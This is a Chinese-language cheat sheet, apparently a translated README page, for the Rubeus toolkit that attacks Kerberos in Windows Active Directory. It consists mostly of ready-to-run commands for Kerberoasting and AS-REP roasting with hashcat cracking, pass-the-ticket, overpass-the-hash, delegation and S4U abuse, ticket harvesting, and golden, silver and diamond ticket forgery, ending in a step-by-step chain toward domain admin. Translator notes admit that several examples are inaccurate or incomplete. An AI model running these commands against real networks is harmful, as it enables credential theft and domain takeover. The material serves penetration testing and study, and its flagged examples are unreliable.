# 🎫 Rubeus：Kerberos 滥用工具集

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██████╗ ██╗   ██╗██████╗ ███████╗██╗   ██╗███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔════╝██║   ██║██╔════╝
  ██████╔╝██║   ██║██████╔╝█████╗  ██║   ██║███████╗
  ██╔══██╗██║   ██║██╔══██╗██╔══╝  ██║   ██║╚════██║
  ██║  ██║╚██████╔╝██████╔╝███████╗╚██████╔╝███████║
  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝
             Kerberos 交互与滥用测试
```

<p align="center">
  <img src="https://img.shields.io/badge/Rubeus-Kerberos-red?style=for-the-badge" alt="Rubeus">
  <img src="https://img.shields.io/badge/Active_Directory-blue?style=for-the-badge" alt="AD">
  <img src="https://img.shields.io/badge/C%23-green?style=for-the-badge" alt="C#">
</p>

---

## 📋 目录

- [Rubeus 是什么](#-what-is-rubeus)
- [票据操作](#-ticket-operations)
- [Kerberoasting](#-kerberoasting)
- [AS-REP Roasting](#-as-rep-roasting)
- [票据攻击](#-ticket-attacks)
- [委派攻击](#-delegation-attacks)
- [黄金票据与白银票据](#-golden--silver-tickets)
- [速查表](#-quick-reference)

---

<a id="-what-is-rubeus"></a>
## 🎯 Rubeus 是什么

**Rubeus** 是一套用于 Kerberos 交互与滥用测试的 C# 工具集：

- 🎫 **票据操作** - 请求、续订和解析票据
- 🔓 **Kerberoasting** - 提取可离线破解的服务票据数据（原文称哈希）
- 🔑 **AS-REP Roasting** - 针对无需预身份验证的用户
- 🎭 **票据传递（Pass-the-Ticket）** - 复用窃取的票据
- ✨ **黄金／白银票据（Golden/Silver Tickets）** - 伪造票据

---

## 🚀 基本用法

### 运行 Rubeus

> **示例范围：** 所有命令、占位符和不完整的旧示例均按原文保留，具体功能与参数以所用版本的[官方文档](https://github.com/GhostPack/Rubeus)为准。PowerShell 示例中的 [`LoadFile`](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.loadfile) 仅加载程序集，本身不等于调用 Rubeus 的命令入口。

```powershell
# 直接执行
.\Rubeus.exe <command> [options]

# 在内存中执行（Cobalt Strike）
execute-assembly Rubeus.exe <command>

# 通过 PowerShell 加载
[System.Reflection.Assembly]::LoadFile("C:\path\Rubeus.exe")
```

---

<a id="-ticket-operations"></a>
## 🎟️ 票据操作

### 请求 TGT（票据授予票据）

```powershell
# 使用密码
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /domain:domain.local

# 使用 NTLM 哈希
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /domain:domain.local

# 使用 AES256 密钥
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /domain:domain.local

# 使用证书
.\Rubeus.exe asktgt /user:admin /certificate:cert.pfx /password:pfxpass

# 输出到文件
.\Rubeus.exe asktgt /user:admin /password:P@ssw0rd /outfile:ticket.kirbi
```

### 请求 TGS（服务票据）

```powershell
# 请求服务票据
.\Rubeus.exe asktgs /ticket:base64ticket /service:cifs/server.domain.local

# 使用文件中的 TGT
.\Rubeus.exe asktgs /ticket:ticket.kirbi /service:http/server.domain.local
```

### 列出票据

> **会话勘误：** [官方 triage 说明](https://github.com/GhostPack/Rubeus#triage)中，`/luid` 筛选指定登录会话，而不是列出所有会话。下方的 `0x3e7` 因此是指定目标；其他 LUID 示例也是占位值，不能假定与实际新建会话一致。

```powershell
# 列出当前用户的票据
.\Rubeus.exe triage

# 列出所有票据（需要管理员权限；原文说明，参见上方勘误）
.\Rubeus.exe triage /luid:0x3e7

# 导出详细票据数据
.\Rubeus.exe dump
```

### 票据传递（Pass-the-Ticket）

```powershell
# 将票据导入当前会话
.\Rubeus.exe ptt /ticket:base64ticket

# 从文件导入
.\Rubeus.exe ptt /ticket:ticket.kirbi

# 创建新的登录会话并导入票据
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe ptt /ticket:ticket.kirbi /luid:0x123456
```

### 解析票据

```powershell
# 显示票据详情
.\Rubeus.exe describe /ticket:base64ticket

# 从文件读取
.\Rubeus.exe describe /ticket:ticket.kirbi
```

---

<a id="-kerberoasting"></a>
## 🍖 Kerberoasting

### 基础 Kerberoasting

```powershell
# 对所有 SPN 进行 Kerberoasting
.\Rubeus.exe kerberoast

# 输出到文件（hashcat 格式）
.\Rubeus.exe kerberoast /outfile:kerberoast.txt

# 针对指定用户
.\Rubeus.exe kerberoast /user:sqlservice

# RC4 降级（etype 23，原文说明，参见下方补充）
.\Rubeus.exe kerberoast /rc4opsec
```

### 高级 Kerberoasting

> **加密与模式说明：** [官方 Kerberoasting 文档](https://github.com/GhostPack/Rubeus#kerberoasting-opsec)说明 `/rc4opsec` 会筛选未启用 AES 的账户，并非通用的强制降级。采用 AES 也不能保证活动更隐蔽；后面的 Hashcat 模式示例依赖捕获数据的加密类型，可对照[官方模式列表](https://hashcat.net/wiki/doku.php?id=example_hashes)。

```powershell
# 使用指定的 TGT
.\Rubeus.exe kerberoast /ticket:base64tgt

# 仅显示统计信息（不请求票据）
.\Rubeus.exe kerberoast /stats

# 针对指定 SPN
.\Rubeus.exe kerberoast /spn:MSSQLSvc/sql.domain.local

# AES 加密（原文称更隐蔽，参见上方补充）
.\Rubeus.exe kerberoast /aes

# 按用户筛选
.\Rubeus.exe kerberoast /user:svc_sql /nowrap
```

### 破解 Kerberoasting 哈希

```bash
# Hashcat（模式 13100）
hashcat -m 13100 kerberoast.txt wordlist.txt

# John
john --wordlist=rockyou.txt kerberoast.txt
```

---

<a id="-as-rep-roasting"></a>
## 🔓 AS-REP Roasting

### 基础 AS-REP Roasting

```powershell
# 查找无需预身份验证的用户并提取 AS-REP 数据以供离线破解
.\Rubeus.exe asreproast

# 输出到文件
.\Rubeus.exe asreproast /outfile:asrep.txt

# 针对指定用户
.\Rubeus.exe asreproast /user:targetuser

# Hashcat 格式
.\Rubeus.exe asreproast /format:hashcat
```

### 破解 AS-REP 哈希

```bash
# Hashcat（模式 18200）
hashcat -m 18200 asrep.txt wordlist.txt
```

---

<a id="-ticket-attacks"></a>
## 🎭 票据攻击

### 哈希转票据（Overpass-the-Hash／Pass-the-Key）

> **会话说明：** [官方票据管理说明](https://github.com/GhostPack/Rubeus#ptt)中，单独使用 `/ptt` 将票据应用于当前会话，并不会创建新会话；其他会话的访问可能需要提升权限。原文首条注释将取票和新建会话混在了一起。

```powershell
# 使用哈希获取 TGT，并创建新会话（原文说明，参见上方勘误）
.\Rubeus.exe asktgt /user:admin /rc4:NTLMHASH /ptt

# 使用 AES 密钥
.\Rubeus.exe asktgt /user:admin /aes256:AESKEY /ptt

# 创建用于承载票据的独立进程
.\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt /luid:0x123456
```

### S4U（Service for User，用户服务）

> **S4U 范围：** 下方首个示例同时指定了 `/msdsspn`；[官方说明](https://github.com/GhostPack/Rubeus#s4u)表明这类调用可涉及完整委派链，不能只根据注释将其理解为单独的 S4U2Self。实际可用性取决于委派配置与账户条件。

```powershell
# S4U2Self：向服务自身模拟用户（原文说明，参见上方补充）
.\Rubeus.exe s4u /user:serviceaccount /rc4:HASH /impersonateuser:admin /msdsspn:cifs/target.domain.local

# S4U2Proxy：向另一服务模拟用户
.\Rubeus.exe s4u /ticket:tgt.kirbi /impersonateuser:admin /msdsspn:cifs/dc.domain.local /altservice:ldap

# 完整流程
.\Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

<a id="-delegation-attacks"></a>
## 🔀 委派攻击

### 非约束委派

```powershell
# 在配置了非约束委派的主机上监视 TGT
.\Rubeus.exe monitor /interval:5 /nowrap

# 指定筛选条件
.\Rubeus.exe monitor /targetuser:DC$ /interval:5

# 收集 TGT
.\Rubeus.exe harvest /interval:30
```

### 约束委派

```powershell
# 请求获准委派的服务票据
.\Rubeus.exe s4u /user:svcaccount /rc4:HASH /impersonateuser:administrator /msdsspn:time/dc.domain.local /altservice:cifs /ptt
```

### 基于资源的约束委派（RBCD）

```powershell
# 使用 PowerMad/PowerView 配置 RBCD 后
# 以攻击者控制的计算机账户请求票据
.\Rubeus.exe s4u /user:attackermachine$ /rc4:MACHINEACCOUNTHASH /impersonateuser:administrator /msdsspn:cifs/target.domain.local /ptt
```

---

<a id="-golden--silver-tickets"></a>
## ✨ 黄金票据与白银票据

### 黄金票据（Golden Ticket）

> **参数勘误：** 原文的 `/krbtgt:` 示例与[项目 golden 参数解析](https://github.com/GhostPack/Rubeus/blob/master/Rubeus/Commands/Golden.cs)不一致，不能按其他工具的语法理解。以下命令保持原样，密钥参数和环境要求需按版本核对。

```powershell
# 创建黄金票据（需要 krbtgt 哈希）
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGTHASH /ptt

# 指定组
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /groups:512,513,519 /ptt

# 使用 AES 密钥
.\Rubeus.exe golden /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /aes256:AESKEY /ptt
```

### 白银票据（Silver Ticket）

> **用途勘误：** 原文将 LDAP 服务票据直接标注为 DCSync，表述不准确。[DCSync 的复制操作](https://attack.mitre.org/detectionstrategies/DET0594/)通过 DRS/RPC 接口进行；持有 LDAP 服务票据本身并不等于满足 DCSync 的服务与权限条件。

```powershell
# 创建白银票据（需要服务账户哈希）
.\Rubeus.exe silver /service:cifs/target.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:SERVICEHASH /ptt

# LDAP 服务（原文标注 DCSync，参见上方勘误）
.\Rubeus.exe silver /service:ldap/dc.domain.local /user:fakeadmin /domain:domain.local /sid:S-1-5-21-... /rc4:DCHASH /ptt
```

### 钻石票据（Diamond Ticket）

> **缺失前提：** 原文示例未包含用于解密、修改后重新签名及加密 TGT 的 KRBTGT 密钥参数；[项目 diamond 实现](https://github.com/GhostPack/Rubeus/blob/master/Rubeus/Commands/Diamond.cs)使用 `/krbkey` 处理该密钥。不能仅凭用户密码和票据中的组声明认定示例完整可用。

```powershell
# 修改合法 TGT
.\Rubeus.exe diamond /user:admin /password:P@ssw0rd /enctype:aes /domain:domain.local /dc:dc.domain.local /ticketuser:administrator /ticketuserid:500 /groups:512 /ptt
```

---

<a id="-quick-reference"></a>
## 📊 速查表

### 常用命令

| 命令 | 说明 |
|---------|-------------|
| `asktgt` | 请求 TGT（票据授予票据） |
| `asktgs` | 请求 TGS（服务票据） |
| `kerberoast` | 提取可离线破解的服务票据数据（原文称哈希） |
| `asreproast` | AS-REP Roasting（无需预身份验证的响应数据离线破解） |
| `ptt` | 票据传递（Pass-the-Ticket） |
| `s4u` | 用户服务（Service for User） |
| `golden` | 伪造黄金票据 |
| `silver` | 伪造白银票据 |
| `dump` | 导出所有票据 |
| `triage` | 列出票据 |

### 身份验证选项

| 选项 | 说明 |
|--------|-------------|
| `/user:` | 用户名 |
| `/password:` | 密码 |
| `/rc4:` | NTLM 哈希 |
| `/aes256:` | AES256 密钥 |
| `/ticket:` | Base64 编码的票据 |

### 常用选项

| 选项 | 说明 |
|--------|-------------|
| `/ptt` | 票据传递（Pass-the-Ticket） |
| `/outfile:` | 输出到文件 |
| `/nowrap` | Base64 输出不换行 |
| `/domain:` | 目标域 |
| `/dc:` | 域控制器 |

### 攻击流程

```powershell
# 1. 进行 Kerberoasting
.\Rubeus.exe kerberoast /outfile:kerb.txt

# 2. 破解哈希
hashcat -m 13100 kerb.txt rockyou.txt

# 3. 使用破解得到的密码获取 TGT
.\Rubeus.exe asktgt /user:svc /password:CrackedPass /ptt

# 4. 或进行 overpass-the-hash
.\Rubeus.exe asktgt /user:admin /rc4:HASH /ptt

# 5. 访问资源
dir \\server\share
```

---

## 📚 参考资源

- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [HarmJ0y 博客](https://blog.harmj0y.net/)
- [SpecterOps](https://specterops.io/)

### 相关速查表
- [BloodHound](../../BloodHound/translations/README.zh-CN.md)
- [Impacket](../../Impacket/translations/README.zh-CN.md)
- [Mimikatz](../../Mimikatz/translations/README.zh-CN.md)

---

<p align="center">
  <b>🎫 掌握 Kerberos！</b><br>
  <i>Rubeus：通往域管理员权限的票据</i>
</p>
